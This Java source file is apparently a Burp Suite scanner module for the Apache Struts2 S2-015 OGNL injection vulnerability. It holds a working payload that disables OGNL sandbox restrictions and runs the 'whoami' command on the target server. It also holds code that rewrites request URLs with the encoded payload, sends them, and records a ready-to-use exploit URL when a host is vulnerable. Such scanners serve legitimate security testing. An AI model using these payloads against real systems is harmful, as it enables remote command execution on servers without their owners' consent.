package module.java.vul;

import burp.*;
import module.Util;

import java.io.PrintWriter;
import java.net.URL;
import java.net.URLEncoder;

public class S2_015 extends IModule {
    public String randomMark = Util.getRandomString(16);
    public String[] injectMark = new String[]{randomMark.substring(0, 9), randomMark.substring(9, 16)};
    public String poc =
        "${" +
        "#context['xwork.MethodAccessor.denyMethodExecution']=false," +
        "#m=#_memberAccess.getClass().getDeclaredField('allowStaticMethodAccess')," +
        "#m.setAccessible(true)," +
        "#m.set(#_memberAccess,true)," +
        "#a='" + injectMark[0] + "'," +
        "#b='" + injectMark[1] + "'," +
        "#q=#a+#b," +
        "#q" +
        "}";
    public String exp =
        "${" +
        "#context['xwork.MethodAccessor.denyMethodExecution']=false," +
        "#m=#_memberAccess.getClass().getDeclaredField('allowStaticMethodAccess')," +
        "#m.setAccessible(true)," +
        "#m.set(#_memberAccess,true)," +
        "#cmd='whoami'," +
        "#q=@org.apache.commons.io.IOUtils@toString(@java.lang.Runtime@getRuntime().exec(#cmd).getInputStream())," +
        "#q" +
        "}";

    @Override
    public IScanIssue start() {
        PrintWriter stderr = new PrintWriter(callbacks.getStderr(), true);
        IHttpService httpService = iHttpRequestResponse.getHttpService();
        IRequestInfo requestInfo = helpers.analyzeRequest(iHttpRequestResponse);
        String url = requestInfo.getUrl().toString();
        String[] tmp = url.split("/");
        String fileName = tmp[tmp.length - 1];

        String[] extensions = new String[]{".action", ".do"};
        for (String ext: extensions) {
            if (fileName.endsWith(ext)) {
                String newFileName = URLEncoder.encode(poc) + ext;
                String newUrl = url.replace(fileName, newFileName);
                try {
                    byte[] request = helpers.buildHttpRequest(new URL(newUrl));
                    IHttpRequestResponse newHttpRequestResponse = callbacks.makeHttpRequest(httpService, request);
                    byte[] response = newHttpRequestResponse.getResponse();
                    String responseText = helpers.bytesToString(response);

                    if (responseText.contains(randomMark)) {
//                        this.iHttpRequestResponse = newHttpRequestResponse;
                        this.detail = url.replace(fileName, URLEncoder.encode(exp)+ext);
                        return creatCustomScanIssue();
                    }
                } catch (Exception e) {
                    stderr.println(e.getMessage());
                }
            }
        }

        return null;
    }
}
